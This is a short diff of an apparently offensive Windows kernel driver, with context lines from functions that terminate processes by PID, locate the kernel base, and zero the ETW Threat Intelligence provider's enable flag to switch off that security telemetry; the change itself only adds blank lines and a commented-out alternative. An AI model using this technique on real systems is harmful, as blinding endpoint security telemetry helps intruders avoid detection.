@@ -10,6 +10,7 @@ extern "C" NTSTATUS ZwQueryInformationProcess(
     OUT PULONG ReturnLength OPTIONAL);
 
 
+
 NTSTATUS TermProcess(ULONG_PTR pidVal) {
     NTSTATUS status;
     HANDLE hProcess = NULL;
@@ -1288,6 +1289,8 @@ NTSTATUS disablingWTI(ULONG64 kernelBase, disKerETWArgs args) {
     DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", *(DWORD64*)providerEnableInfoAddress & 0xFF);
 
     DbgPrintEx(0, 0, "[+] Disabling ETWTI Provider:\n");
+    //InterlockedExchange((DWORD64*)providerEnableInfoAddress, 0);
+
     *(DWORD64*)providerEnableInfoAddress = 0;
 
     DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", *(DWORD64*)providerEnableInfoAddress & 0xFF);
@@ -1348,7 +1351,6 @@ UINT64 FindKernelBase() {
     ExFreePoolWithTag(moduleInfo, 'Tag1');
     return kernelBase;
 }
-
 
 
 // Function to safely read kernel memory by mapping physical address space
